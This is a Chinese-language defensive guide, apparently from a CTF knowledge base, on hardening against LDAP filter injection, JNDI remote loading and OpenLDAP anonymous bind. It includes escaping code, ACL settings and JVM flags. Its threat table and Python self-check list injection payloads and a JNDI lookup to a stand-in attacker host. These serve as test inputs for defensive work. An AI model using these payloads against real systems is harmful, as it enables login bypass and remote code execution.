---
id: "ctf-website/02-auth/ldap-injection-defense"
title: "LDAP 过滤器注入与匿名绑定防御"
title_en: "LDAP Filter Injection and Anonymous Bind Defense"
summary: >
  针对 LDAP 过滤器注入引起的登录绕过、属性前缀盲注、AND/OR 逻辑篡改、Java JNDI 远程引用反序列化链及 OpenLDAP 匿名绑定全量导出风险，提供 RFC 4515 转义与参数化查询模板、DN 转义规范、JVM JNDI trustURLCodebase 禁令、OpenLDAP ACL 最小权限配置及可运行的 Python 自检脚本。
summary_en: >
  Defensive guide against LDAP filter injection covering authentication bypass, blind attribute extraction, boolean logic tampering, Java LDAP-to-JNDI deserialization chains, and OpenLDAP anonymous bind exposure. Includes RFC 4515 filter/DN escaping, JVM JNDI hardening, OpenLDAP ACL restrictions, and runnable Python verification tests.
board: "ctf-website"
category: "02-auth"
signals: ["LDAP", "过滤器注入", "RFC 4515", "JNDI", "trustURLCodebase", "anonymous bind", "OpenLDAP", "盲注防御"]
mcp_tools: ["kb_router", "kb_read_file", "kb_catalog"]
keywords: ["LDAP注入防御", "LDAP filter escaping", "RFC 4515", "JNDI加固", "OpenLDAP ACL", "匿名绑定禁用"]
difficulty: "advanced"
tags: ["defense", "blue-team", "authentication", "ldap", "injection", "jndi"]
language: "zh-CN"
last_updated: "2026-11-12"
related_articles: ["ctf-website/02-auth/ldap-injection", "ctf-website/02-auth/oauth-sso-defense", "ctf-website/24-database/04-config-exposure"]
track: "blue"
defends: "ctf-website/02-auth/ldap-injection"
---

# LDAP 过滤器注入与匿名绑定防御

LDAP 注入的根本原因是把用户输入直接拼入 RFC 4515 搜索过滤器或 DN 路径，同时目录服务端未关闭匿名绑定或返回了高敏感属性（如 `userPassword`、`description`、`labeledURI`）。完整防护需要覆盖输入转义、错误抑制、属性白名单、OpenLDAP 访问控制与 Java JNDI 禁用远程加载。

## 威胁面与防御映射

| 攻击向量 | 根因机制 | 防御控制点 |
|---|---|---|
| 认证绕过 (`*)(uid=*))(|(uid=*`) | 登录 filter 未对 `* ( ) \ NUL` 执行 RFC 4515 十六进制转义 | 使用 `ldap3.utils.conv.escape_filter_chars` 对所有输入参数转义，并采用“先查精确 DN 再 Bind”流程 |
| 盲注逐字符提取 (`*)(password=a*`) | 通配符 `*` 未转义且返回页面/错误差异暴露前缀命中 | 禁用用户输入中的通配符；对认证失败统一返回恒定响应与相同状态码 |
| 二次编码绕过 (`\2a`) | 业务层在转义后又执行了 URL 解码或字符串 unescape | 保持“先解码、再校验字符集、最后紧邻查询执行 RFC 4515 转义”的单向顺序 |
| LDAP → JNDI 反序列化 | Java `InitialDirContext` 允许加载外部 `javaCodeBase` 或任意 JNDI URL | 固定 `com.sun.jndi.ldap.object.trustURLCodebase=false`，拒绝用户输入进入 `lookup()`，并启用 JNDI URL 白名单 |
| OpenLDAP 匿名绑定与全表读取 | `olcAccess` 允许 `anonymous read` 与全属性枚举 | 禁用匿名绑定（`disallow bind_anon`），按最小属性集限制只读字段 |

## 防御工作流

```text
1. 目录查询结构重构
   └─ 登录认证改为：精确匹配唯一账号字段查 DN -> 使用用户凭据执行独立 Bind，禁止用密码拼入 Filter
2. 强制双层转义（RFC 4515 Filter + RFC 4514 DN）
   └─ 在构建查询语句前一刻执行转义，严禁转义后再做任何 decode
3. 目录最小权限与匿名禁用
   └─ OpenLDAP 关闭 bind_anon，ACL 禁止非授权账号读取 userPassword / description / labeledURI
4. 统一响应与错误屏蔽
   └─ 屏蔽 Bad search filter 等异常细节，搜索接口强制最小查询长度与结果上限
5. Java JNDI 运行时锁定
   └─ 升级 JDK 并显式锁定 trustURLCodebase=false 与 RMI/LDAP 反序列化过滤器
```

### 1. Python RFC 4515 Filter 与 RFC 4514 DN 转义实现

```python
import re

# 严格账号字符白名单（可按实际目录规范收紧）
USERNAME_RE = re.compile(r"^[a-zA-Z0-9._-]{2,64}$")

RFC4515_MAP = {
    "\\": r"\5c",
    "*": r"\2a",
    "(": r"\28",
    ")": r"\29",
    "\x00": r"\00",
}

RFC4514_SPECIAL = set(',+"\\<>;=')


def escape_ldap_filter(value: str) -> str:
    """按 RFC 4515 对 LDAP 搜索过滤器值执行完整转义，先替换反斜杠。"""
    if not isinstance(value, str):
        raise TypeError("filter value must be str")
    out = []
    for ch in value:
        if ch in RFC4515_MAP:
            out.append(RFC4515_MAP[ch])
        elif ord(ch) < 0x20 or ord(ch) >= 0x7F:
            out.append("".join(f"\\{b:02x}" for b in ch.encode("utf-8")))
        else:
            out.append(ch)
    return "".join(out)


def escape_ldap_dn(value: str) -> str:
    """按 RFC 4514 对 DN 组件值进行转义，防止 DN 路径注入。"""
    if not value:
        return ""
    chars = []
    for idx, ch in enumerate(value):
        if ch in RFC4514_SPECIAL or (idx == 0 and ch in (" ", "#")) or (idx == len(value) - 1 and ch == " "):
            chars.append("\\" + ch)
        elif ord(ch) < 0x20:
            chars.append(f"\\{ord(ch):02x}")
        else:
            chars.append(ch)
    return "".join(chars)


def build_safe_login_filter(username: str) -> str:
    """仅用账号构造等值过滤，严禁把密码或权限字段拼入查询过滤器。"""
    if not USERNAME_RE.fullmatch(username):
        raise ValueError("invalid username format")
    safe_user = escape_ldap_filter(username)
    return f"(&(objectClass=person)(uid={safe_user}))"
```

### 2. OpenLDAP 与 Java JNDI 加固配置

```ldif
# OpenLDAP slapd.d 加固配置：禁用匿名绑定与限制敏感属性读取
dn: cn=config
changetype: modify
add: olcDisallows
olcDisallows: bind_anon
-
add: olcRequires
olcRequires: authc

# 禁止普通账号读取 userPassword 与内部配置属性
dn: olcDatabase={1}mdb,cn=config
changetype: modify
replace: olcAccess
olcAccess: {0}to attrs=userPassword
  by self write
  by anonymous auth
  by * none
olcAccess: {1}to attrs=description,labeledURI,info
  by dn.exact="cn=dir-admin,dc=example,dc=com" read
  by * none
olcAccess: {2}to dn.subtree="ou=users,dc=example,dc=com"
  by users read
  by * none
```

```properties
# JVM 启动参数：显式阻断 JNDI 远程代码加载
-Dcom.sun.jndi.ldap.object.trustURLCodebase=false
-Dcom.sun.jndi.rmi.object.trustURLCodebase=false
-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=false
```

## 验证与判定标准

运行下方脚本核验 [ldap-injection.md](../../../../red/ctf-website/techniques/02-auth/ldap-injection.md) 中的所有绕过与盲注载荷在转义与白名单控制下均被阻断：

```python
def run_ldap_hardening_checks() -> None:
    payloads = [
        "*)(uid=*))(|(uid=*",
        "admin)(&)",
        "*)(|(password=*",
        "admin)(|(department=IT",
        "admin\\2a",
        "admin\x00evil",
        "${jndi:ldap://attacker.example:1389/Exploit}",
    ]
    for p in payloads:
        escaped = escape_ldap_filter(p)
        assert "*" not in escaped and "(" not in escaped and ")" not in escaped and "\x00" not in escaped, (
            f"unescaped metacharacter in {escaped}"
        )
        try:
            build_safe_login_filter(p)
        except ValueError:
            pass
        else:
            raise AssertionError(f"malicious username accepted: {p}")

    assert build_safe_login_filter("alice.ops_01") == "(&(objectClass=person)(uid=alice.ops_01))"
    assert escape_ldap_dn("alice,ou=admin") == r"alice\,ou\=admin"
    print("PASS: all LDAP filter/DN/login hardening checks passed")


if __name__ == "__main__":
    run_ldap_hardening_checks()
```

判定标准：
1. **特殊字符零透传**：向查询输入 `*`、`)(`、`\`、`\00` 后，LDAP 服务端不会报错 `Bad search filter`，也不会返回多条或恒真匹配。
2. **匿名连接拒绝**：使用 `ldapsearch -x` 无凭据连接目录端口时返回 `Inappropriate authentication` 或 `Stronger authentication required`。
3. **盲注响应一致**：无论前缀是否匹配，登录失败均返回统一 HTTP 状态码与完全一致的响应体长度和摘要。

## MCP 工具映射

| 防御阶段 | MCP 工具 | 说明 |
|---|---|---|
| 防御知识定位 | `kb_router` | 按 `LDAP`、`JNDI`、`OpenLDAP` 检索相关防御文档 |
| 规程读取 | `kb_read_file` | 读取 `ldap-injection-defense` 与认证关联文档 |
| 目录索引核查 | `kb_catalog` | 查看 `02-auth` 板块中与目录服务和 SSO 相关的条目 |
